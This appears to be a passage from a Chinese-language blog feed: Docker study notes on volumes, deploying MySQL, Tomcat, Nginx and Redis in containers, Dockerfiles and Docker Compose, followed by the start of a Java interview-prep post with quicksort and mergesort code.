<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301103733215.png" alt="image-20230301103733215"></p>
<p><strong>如果忘了对应的数据卷可以用inspect看</strong></p>
<h5 id="数据卷容器"><a href="#数据卷容器" class="headerlink" title="数据卷容器"></a>数据卷容器</h5><p>多容器进行数据交换 1. 多个容器挂载同一个数据卷 2. 数据卷容器</p>
<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301102705638.png" alt="image-20230301102705638" style="zoom: 67%;" />

<h5 id="配置数据卷容器"><a href="#配置数据卷容器" class="headerlink" title="配置数据卷容器"></a>配置数据卷容器</h5><p>1、创建启动c3数据卷容器，使用 –v 参数 设置数据卷 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run –it --name=c3 –v /volume centos:7 /bin/bash  </span><br></pre></td></tr></table></figure>

<p>2、创建启动 c1 c2 容器，使用 –-volumes-from 参数 设置数据卷</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run –it --name=c1 --volumes-from c3 centos:7 /bin/bash </span><br><span class="line">docker run –it --name=c2 --volumes-from c3 centos:7 /bin/bash </span><br></pre></td></tr></table></figure>

<h3 id="4、Docker应用部署"><a href="#4、Docker应用部署" class="headerlink" title="4、Docker应用部署"></a>4、Docker应用部署</h3><h5 id="MySql部署："><a href="#MySql部署：" class="headerlink" title="MySql部署："></a>MySql部署：</h5><p>需求：在Docker容器中部署MySQL，并通过外部mysql客户端操作MySQL Server。</p>
<p>案例：① 搜索mysql镜像 ② 拉取mysql镜像 ③ 创建容器 ④ 操作容器中的mysql</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当容器中的网络服务需要被外部机器访问时，可以将容器中提供服务的端口映射到宿主机的端口上。外部机 器访问宿主机的该端口，从而间接访问容器的服务。 </span><br><span class="line"></span><br><span class="line">这种操作称为：端口映射</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301105421936.png" alt="image-20230301105421936"></p>
<ol>
<li>搜索mysql镜像</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker search mysql</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>拉取mysql镜像</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull mysql:5.6</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>创建容器，设置端口映射、目录映射</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在/root目录下创建mysql目录用于存储mysql数据信息</span></span><br><span class="line">mkdir ~/mysql</span><br><span class="line">cd ~/mysql</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -id \</span><br><span class="line">-p 3307:3306 \</span><br><span class="line">--name=c_mysql \</span><br><span class="line">-v $PWD/conf:/etc/mysql/conf.d \</span><br><span class="line">-v $PWD/logs:/logs \</span><br><span class="line">-v $PWD/data:/var/lib/mysql \</span><br><span class="line">-e MYSQL_ROOT_PASSWORD=123456 \</span><br><span class="line">mysql:5.6</span><br></pre></td></tr></table></figure>

<ul>
<li>参数说明：<ul>
<li><strong>-p 3307:3306</strong>：将容器的 3306 端口映射到宿主机的 3307 端口。</li>
<li><strong>-v $PWD&#x2F;conf:&#x2F;etc&#x2F;mysql&#x2F;conf.d</strong>：将主机当前目录下的 conf&#x2F;my.cnf 挂载到容器的 &#x2F;etc&#x2F;mysql&#x2F;my.cnf。配置目录</li>
<li><strong>-v $PWD&#x2F;logs:&#x2F;logs</strong>：将主机当前目录下的 logs 目录挂载到容器的 &#x2F;logs。日志目录</li>
<li><strong>-v $PWD&#x2F;data:&#x2F;var&#x2F;lib&#x2F;mysql</strong> ：将主机当前目录下的data目录挂载到容器的 &#x2F;var&#x2F;lib&#x2F;mysql 。数据目录</li>
<li><strong>-e MYSQL_ROOT_PASSWORD&#x3D;123456：</strong>初始化 root 用户的密码。</li>
</ul>
</li>
</ul>
<ol start="4">
<li>进入容器，操作mysql</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker exec –it c_mysql /bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301115710533.png" alt="image-20230301115710533"></p>
<ol start="5">
<li>使用外部机器连接容器中的mysql</li>
</ol>
<h5 id="部署Tomcat"><a href="#部署Tomcat" class="headerlink" title="部署Tomcat"></a>部署Tomcat</h5><p>要求：在Docker容器中部署Tomcat，并通过外部机器访问Tomcat部署的项目。</p>
<p>实现步骤 ① 搜索tomcat镜像 ② 拉取tomcat镜像 ③ 创建容器 ④ 部署项目 ⑤ 测试访问</p>
<ol>
<li>搜索tomcat镜像</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker search tomcat</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>拉取tomcat镜像</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull tomcat</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>创建容器，设置端口映射、目录映射</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在/root目录下创建tomcat目录用于存储tomcat数据信息</span></span><br><span class="line">mkdir ~/tomcat</span><br><span class="line">cd ~/tomcat</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -id --name=c_tomcat \</span><br><span class="line">-p 8080:8080 \</span><br><span class="line">-v $PWD:/usr/local/tomcat/webapps \</span><br><span class="line">tomcat </span><br></pre></td></tr></table></figure>

<ul>
<li><p>参数说明：</p>
<ul>
<li><p><strong>-p 8080:8080：</strong>将容器的8080端口映射到主机的8080端口</p>
<p><strong>-v $PWD:&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps：</strong>将主机中当前目录挂载到容器的webapps</p>
</li>
</ul>
</li>
</ul>
<ol start="4">
<li><p>使用外部机器访问tomcat</p>
<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301141233554.png" alt="image-20230301141233554" style="zoom:50%;" />

<p>成功</p>
</li>
</ol>
<h5 id="部署Nginx"><a href="#部署Nginx" class="headerlink" title="部署Nginx"></a>部署Nginx</h5><p>需求：在Docker容器中部署Nginx，并通过外部机器访问Nginx</p>
<p>步骤：① 搜索Nginx镜像 ② 拉取Nginx镜像 ③ 创建容器 ④ 测试访问</p>
<ol>
<li>搜索nginx镜像</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker search nginx</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>拉取nginx镜像</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull nginx</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>创建容器，设置端口映射、目录映射</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在/root目录下创建nginx目录用于存储nginx数据信息</span></span><br><span class="line">mkdir ~/nginx</span><br><span class="line">cd ~/nginx</span><br><span class="line">mkdir conf</span><br><span class="line">cd conf</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在~/nginx/conf/下创建nginx.conf文件,粘贴下面内容</span></span><br><span class="line">vim nginx.conf</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">user  nginx;</span><br><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">error_log  /var/log/nginx/error.log warn;</span><br><span class="line">pid        /var/run/nginx.pid;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       /etc/nginx/mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span><br><span class="line">                      &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span><br><span class="line">                      &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;</span><br><span class="line"></span><br><span class="line">    access_log  /var/log/nginx/access.log  main;</span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    #tcp_nopush     on;</span><br><span class="line"></span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    #gzip  on;</span><br><span class="line"></span><br><span class="line">    include /etc/nginx/conf.d/*.conf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>




<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -id --name=c_nginx \</span><br><span class="line">-p 80:80 \</span><br><span class="line">-v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf \</span><br><span class="line">-v $PWD/logs:/var/log/nginx \</span><br><span class="line">-v $PWD/html:/usr/share/nginx/html \</span><br><span class="line">nginx</span><br></pre></td></tr></table></figure>

<ul>
<li>参数说明：<ul>
<li><strong>-p 80:80</strong>：将容器的 80端口映射到宿主机的 80 端口。</li>
<li><strong>-v $PWD&#x2F;conf&#x2F;nginx.conf:&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</strong>：将主机当前目录下的 &#x2F;conf&#x2F;nginx.conf 挂载到容器的 :&#x2F;etc&#x2F;nginx&#x2F;nginx.conf。配置目录</li>
<li><strong>-v $PWD&#x2F;logs:&#x2F;var&#x2F;log&#x2F;nginx</strong>：将主机当前目录下的 logs 目录挂载到容器的&#x2F;var&#x2F;log&#x2F;nginx。日志目录</li>
</ul>
</li>
</ul>
<ol start="4">
<li><p>使用外部机器访问nginx</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301142036233.png" alt="image-20230301142036233"></p>
</li>
</ol>
<h5 id="部署Redis"><a href="#部署Redis" class="headerlink" title="部署Redis"></a>部署Redis</h5><p>需求：在Docker容器中部署Redis，并通过外部机器访问Redis。</p>
<p>实现步骤 ① 搜索Redis镜像 ② 拉取Redis镜像 ③ 创建容器 ④ 测试访问</p>
<ol>
<li>搜索redis镜像</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker search redis</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>拉取redis镜像</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull redis:5.0</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>创建容器，设置端口映射</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -id --name=c_redis -p 6379:6379 redis:5.0</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>使用外部机器连接redis</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./redis-cli.exe -h 192.168.149.135 -p 6379</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301142459588.png" alt="image-20230301142459588"></p>
<h3 id="5、Dockerfile"><a href="#5、Dockerfile" class="headerlink" title="5、Dockerfile"></a>5、Dockerfile</h3><h5 id="Docker镜像原理"><a href="#Docker镜像原理" class="headerlink" title="Docker镜像原理"></a>Docker镜像原理</h5><p>问题：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Docker 镜像本质是什么？</span><br><span class="line">Docker 中一个centos镜像为什么只有200MB，而一个centos操作系统的iso文件要几个个G？</span><br><span class="line">Docker 中一个tomcat镜像为什么有500MB，而一个tomcat安装包只有70多MB？</span><br></pre></td></tr></table></figure>

<p>理论知识：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">操作系统组成部分：</span><br><span class="line">进程通信子系统</span><br><span class="line">内存管理子系统</span><br><span class="line">备管理子系统</span><br><span class="line">文件管理子系统</span><br><span class="line">网络通信子系统</span><br><span class="line">作业控制子系统</span><br><span class="line">进程调度子系统</span><br><span class="line"></span><br><span class="line">Linux文件系统由bootfs和rootfs两部分组成</span><br><span class="line">• bootfs：包含bootloader（引导加载程序）和 kernel（内核）</span><br><span class="line">• rootfs： root文件系统，包含的就是典型 Linux 系统中的/dev，/proc，/bin，/etc等标准目录和文件</span><br><span class="line">• 不同的linux发行版，bootfs基本一样，而rootfs不同，如ubuntu，centos等</span><br></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301143313641.png" alt="image-20230301143313641" style="zoom:67%;" />

<p>问题回答：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. Docker 镜像本质是什么？</span><br><span class="line">• 是一个分层文件系统</span><br><span class="line">2. Docker 中一个centos镜像为什么只有200MB，而一个centos操作系统的iso文件要几个个G？</span><br><span class="line">• Centos的iso镜像文件包含bootfs和rootfs，而docker的centos镜像复用操作系统的bootfs，只有rootfs和其他镜像层</span><br><span class="line">3. Docker 中一个tomcat镜像为什么有500MB，而一个tomcat安装包只有70多MB？</span><br><span class="line">• 由于docker中镜像是分层的，tomcat虽然只有70多MB，但他需要依赖于父镜像和基础镜像，所有整个对外暴露的tomcat镜像大小500多MB</span><br></pre></td></tr></table></figure>

<p>docker inspect tomcat 效果：</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301143908837.png" alt="image-20230301143908837"></p>
<h5 id="Docker镜像制作"><a href="#Docker镜像制作" class="headerlink" title="Docker镜像制作"></a>Docker镜像制作</h5><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301144055969.png" alt="image-20230301144055969" style="zoom:50%;" />

<p> 注意：</p>
<ol>
<li>自己制作镜像时，目录挂载不会生效，其它会保存</li>
</ol>
<h5 id="Dockerfile概念"><a href="#Dockerfile概念" class="headerlink" title="Dockerfile概念"></a>Dockerfile概念</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Dockerfile 是一个文本文件 </span><br><span class="line">包含了一条条的指令 </span><br><span class="line">每一条指令构建一层，基于基础镜像，最终构建出一个新的镜像 </span><br><span class="line">对于开发人员：可以为开发团队提供一个完全一致的开发环境 </span><br><span class="line">对于测试人员：可以直接拿开发时所构建的镜像或者通过Dockerfile文件 构建一个新的镜像开始工作了 </span><br><span class="line">对于运维人员：在部署时，可以实现应用的无缝移</span><br></pre></td></tr></table></figure>

<p>参考网站：<a href="https://hub.docker.com/">https://hub.docker.com</a></p>
<h5 id="Dockerfile关键字"><a href="#Dockerfile关键字" class="headerlink" title="Dockerfile关键字"></a>Dockerfile关键字</h5><table>
<thead>
<tr>
<th>关键字</th>
<th>作用</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>FROM</td>
<td>指定父镜像</td>
<td>指定dockerfile基于那个image构建</td>
</tr>
<tr>
<td>MAINTAINER</td>
<td>作者信息</td>
<td>用来标明这个dockerfile谁写的</td>
</tr>
<tr>
<td>LABEL</td>
<td>标签</td>
<td>用来标明dockerfile的标签 可以使用Label代替Maintainer 最终都是在docker image基本信息中可以查看</td>
</tr>
<tr>
<td>RUN</td>
<td>执行命令</td>
<td>执行一段命令 默认是&#x2F;bin&#x2F;sh 格式: RUN command 或者 RUN [“command” , “param1”,”param2”]</td>
</tr>
<tr>
<td>CMD</td>
<td>容器启动命令</td>
<td>提供启动容器时候的默认命令 和ENTRYPOINT配合使用.格式 CMD command param1 param2 或者 CMD [“command” , “param1”,”param2”]</td>
</tr>
<tr>
<td>ENTRYPOINT</td>
<td>入口</td>
<td>一般在制作一些执行就关闭的容器中会使用</td>
</tr>
<tr>
<td>COPY</td>
<td>复制文件</td>
<td>build的时候复制文件到image中</td>
</tr>
<tr>
<td>ADD</td>
<td>添加文件</td>
<td>build的时候添加文件到image中 不仅仅局限于当前build上下文 可以来源于远程服务</td>
</tr>
<tr>
<td>ENV</td>
<td>环境变量</td>
<td>指定build时候的环境变量 可以在启动的容器的时候 通过-e覆盖 格式ENV name&#x3D;value</td>
</tr>
<tr>
<td>ARG</td>
<td>构建参数</td>
<td>构建参数 只在构建的时候使用的参数 如果有ENV 那么ENV的相同名字的值始终覆盖arg的参数</td>
</tr>
<tr>
<td>VOLUME</td>
<td>定义外部可以挂载的数据卷</td>
<td>指定build的image那些目录可以启动的时候挂载到文件系统中 启动容器的时候使用 -v 绑定 格式 VOLUME [“目录”]</td>
</tr>
<tr>
<td>EXPOSE</td>
<td>暴露端口</td>
<td>定义容器运行的时候监听的端口 启动容器的使用-p来绑定暴露端口 格式: EXPOSE 8080 或者 EXPOSE 8080&#x2F;udp</td>
</tr>
<tr>
<td>WORKDIR</td>
<td>工作目录</td>
<td>指定容器内部的工作目录 如果没有创建则自动创建 如果指定&#x2F; 使用的是绝对地址 如果不是&#x2F;开头那么是在上一条workdir的路径的相对路径</td>
</tr>
<tr>
<td>USER</td>
<td>指定执行用户</td>
<td>指定build或者启动的时候 用户 在RUN CMD ENTRYPONT执行的时候的用户</td>
</tr>
<tr>
<td>HEALTHCHECK</td>
<td>健康检查</td>
<td>指定监测当前容器的健康监测的命令 基本上没用 因为很多时候 应用本身有健康监测机制</td>
</tr>
<tr>
<td>ONBUILD</td>
<td>触发器</td>
<td>当存在ONBUILD关键字的镜像作为基础镜像的时候 当执行FROM完成之后 会执行 ONBUILD的命令 但是不影响当前镜像 用处也不怎么大</td>
</tr>
<tr>
<td>STOPSIGNAL</td>
<td>发送信号量到宿主机</td>
<td>该STOPSIGNAL指令设置将发送到容器的系统调用信号以退出。</td>
</tr>
<tr>
<td>SHELL</td>
<td>指定执行脚本的shell</td>
<td>指定RUN CMD ENTRYPOINT 执行命令的时候 使用的shell</td>
</tr>
</tbody></table>
<h5 id="案例1"><a href="#案例1" class="headerlink" title="案例1"></a>案例1</h5><p>需求：定义dockerfile，发布springboot项目</p>
<p>实现步骤 ① 定义父镜像：FROM java:8 ② 定义作者信息：MAINTAINER itheima  ③ 将jar包添加到容器： ADD springboot.jar app.jar ④ 定义容器启动执行的命令：CMD java–jar app.jar ⑤ 通过dockerfile构建镜像：docker bulid –f dockerfile文件路径 –t 镜像名称:版本</p>
<p>成功</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301152821606.png" alt="image-20230301152821606"></p>
<h5 id="案例2"><a href="#案例2" class="headerlink" title="案例2"></a>案例2</h5><p>需求：自定义centos7镜像。</p>
<p>要求：1.默认登录路经为&#x2F;usr 2.可以使用vim</p>
<p>dockerfile：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos:<span class="number">7</span></span><br><span class="line"><span class="keyword">MAINTAINER</span> realikun404</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> yum install -y vim</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /usr</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> /bin/bash</span></span><br></pre></td></tr></table></figure>

<p>然后</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -f dockerfile -t mycentos:1 .</span><br></pre></td></tr></table></figure>

<h3 id="6、Docker服务编排"><a href="#6、Docker服务编排" class="headerlink" title="6、Docker服务编排"></a>6、Docker服务编排</h3><h5 id="服务编排概念"><a href="#服务编排概念" class="headerlink" title="服务编排概念"></a>服务编排概念</h5><p>微服务架构的应用系统中一般包含若干个微服务，每个微服务一般都会部署多个实例，如果每个微服务都要手动启停 ，维护的工作量会很大。 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">要从Dockerfile build image 或者去dockerhub拉取image </span><br><span class="line">要创建多个container </span><br><span class="line">要管理这些container（启动停止删除） </span><br></pre></td></tr></table></figure>

<p>服务编排： 按照一定的业务规则批量管理容器</p>
<h5 id="Docker-Compose概述"><a href="#Docker-Compose概述" class="headerlink" title="Docker Compose概述"></a>Docker Compose概述</h5><p>Docker Compose是一个编排多容器分布式部署的工具，提供命令集管理容器化应用的完整开发周期，包括服务构建 ，启动和停止。使用步骤：</p>
<ul>
<li><input disabled="" type="checkbox"> 利用 Dockerfile 定义运行环境镜像</li>
<li><input disabled="" type="checkbox"> 使用 docker-compose.yml 定义组成应用的各服务</li>
<li><input disabled="" type="checkbox"> 运行 docker-compose up 启动应用</li>
</ul>
<h5 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h5><p>安装Docker Compose</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Compose目前已经完全支持Linux、Mac OS和Windows，在我们安装Compose之前，需要先安装Docker。下面我 们以编译好的二进制包方式安装在Linux系统中。</span> </span><br><span class="line">curl -L https://github.com/docker/compose/releases/download/1.22.0/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置文件可执行权限</span> </span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看版本信息</span> </span><br><span class="line">docker-compose -version</span><br></pre></td></tr></table></figure>

<p>卸载Docker Compose</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">二进制包方式安装的，删除二进制文件即可</span></span><br><span class="line">rm /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>



<p>使用docker compose编排nginx+springboot项目</p>
<ol>
<li>创建docker-compose目录</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir ~/docker-compose</span><br><span class="line">cd ~/docker-compose</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>编写 docker-compose.yml 文件</li>
</ol>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">version: <span class="string">&#x27;3&#x27;</span></span><br><span class="line">services:</span><br><span class="line">  nginx:</span><br><span class="line">   image: nginx</span><br><span class="line">   ports:</span><br><span class="line">    - <span class="number">80</span>:<span class="number">80</span></span><br><span class="line">   links:</span><br><span class="line">    - app</span><br><span class="line">   volumes:</span><br><span class="line">    - ./nginx/conf.d:/etc/nginx/conf.d</span><br><span class="line">  app:</span><br><span class="line">    image: app</span><br><span class="line">    <span class="keyword">expose</span>:</span><br><span class="line">      - <span class="string">&quot;8080&quot;</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>创建.&#x2F;nginx&#x2F;conf.d目录</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p ./nginx/conf.d</span><br></pre></td></tr></table></figure>



<ol start="4">
<li>在.&#x2F;nginx&#x2F;conf.d目录下 编写itheima.conf文件</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    access_log off;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://app:8080;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>在~&#x2F;docker-compose 目录下 使用docker-compose 启动容器</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker-compose up</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>测试访问</li>
</ol>
<h3 id="7、私有镜像"><a href="#7、私有镜像" class="headerlink" title="7、私有镜像"></a>7、私有镜像</h3><p>略</p>
<h3 id="8、Docker容器虚拟化与传统虚拟机相比"><a href="#8、Docker容器虚拟化与传统虚拟机相比" class="headerlink" title="8、Docker容器虚拟化与传统虚拟机相比"></a>8、Docker容器虚拟化与传统虚拟机相比</h3><p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301161119318.png" alt="image-20230301161119318"></p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301161129373.png" alt="image-20230301161129373"></p>
]]></content>
      <tags>
        <tag>容器</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>java_常见题目整理</title>
    <url>/2024/10/10/java-%E5%B8%B8%E8%A7%81%E9%A2%98%E7%9B%AE%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<p>常见题目和接下来要学的东西</p>
<span id="more"></span>

<p>[toc]</p>
<h1 id="手撕"><a href="#手撕" class="headerlink" title="手撕"></a>手撕</h1><h2 id="hot100"><a href="#hot100" class="headerlink" title="hot100"></a>hot100</h2><p>已创建新文件</p>
<h2 id="红黑树"><a href="#红黑树" class="headerlink" title="红黑树"></a>红黑树</h2><p>左旋右旋创建原理</p>
<h2 id="输入输出处理"><a href="#输入输出处理" class="headerlink" title="输入输出处理"></a>输入输出处理</h2><p><a href="https://blog.csdn.net/weixin_44589991/article/details/115838376">java 输入输出总结（牛客、笔试、机试）_牛客网输入输出java-CSDN博客</a></p>
<p><a href="https://www.nowcoder.com/exam/oj?page=1&tab=%E7%AE%97%E6%B3%95%E7%AC%94%E8%AF%95&topicId=372">牛客网在线编程_算法笔试_输入输出练习</a></p>
<p><a href="https://blog.csdn.net/qq_42403042/article/details/107533785">牛客网输入输出（Java）总结_牛客网输入输出java-CSDN博客</a></p>
<h2 id="排序算法"><a href="#排序算法" class="headerlink" title="排序算法"></a>排序算法</h2><p><a href="https://www.runoob.com/w3cnote/ten-sorting-algorithm.html">1.0 十大经典排序算法 | 菜鸟教程</a></p>
<h3 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">quickSort</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> left, <span class="type">int</span> right)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(left &gt;= right) <span class="keyword">return</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[left];<span class="comment">//基准值</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> left, j = right;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; j)&#123;</span><br><span class="line">        <span class="keyword">while</span> (temp &lt;= arr[j] &amp;&amp; i &lt; j) j--;</span><br><span class="line">        <span class="keyword">while</span> (temp &gt;= arr[i] &amp;&amp; i &lt; j) i++;</span><br><span class="line">        <span class="keyword">if</span>(i &lt; j)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">t</span> <span class="operator">=</span> arr[i];</span><br><span class="line">            arr[i] = arr[j];</span><br><span class="line">            arr[j] = t;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    arr[left] = arr[i];</span><br><span class="line">    arr[i] = temp;</span><br><span class="line">    quickSort(arr, left, i - <span class="number">1</span>);</span><br><span class="line">    quickSort(arr, i + <span class="number">1</span>, right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h3><p><a href="https://zhuanlan.zhihu.com/p/127843825">Java编程入门，归并排序（Merge Sort）怎么做？ - 知乎</a></p>
<p>递归写法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">mergeSort</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> left, <span class="type">int</span> right)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(left &gt;= right) <span class="keyword">return</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left + right) / <span class="number">2</span>;<span class="comment">//left&lt;=mid&lt;right</span></span><br><span class="line">    mergeSort(arr, left, mid);</span><br><span class="line">    mergeSort(arr, mid + <span class="number">1</span>, right);</span><br><span class="line">    merge(arr, left, mid, right);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">merge</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> left, <span class="type">int</span> mid, <span class="type">int</span> right)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] tempArr = <span class="keyword">new</span> <span class="title class_">int</span>[right - left + <span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> <span class="variable">p1</span> <span class="operator">=</span> left;</span><br><span class="line">    <span class="type">int</span> <span class="variable">p2</span> <span class="operator">=</span> mid + <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (p1 &lt;= mid &amp;&amp; p2 &lt;= right)&#123;</span><br><span class="line">        <span class="keyword">if</span>(arr[p1] &lt;= arr[p2]) tempArr[i++] = arr[p1++];</span><br><span class="line">        <span class="keyword">else</span> tempArr[i++] = arr[p2++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (p1 &lt;= mid) tempArr[i++] = arr[p1++];</span><br><span class="line">    <span class="keyword">while</span> (p2 &lt;= right) tempArr[i++] = arr[p2++];</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; (right - left + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        arr[i + left] = tempArr[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

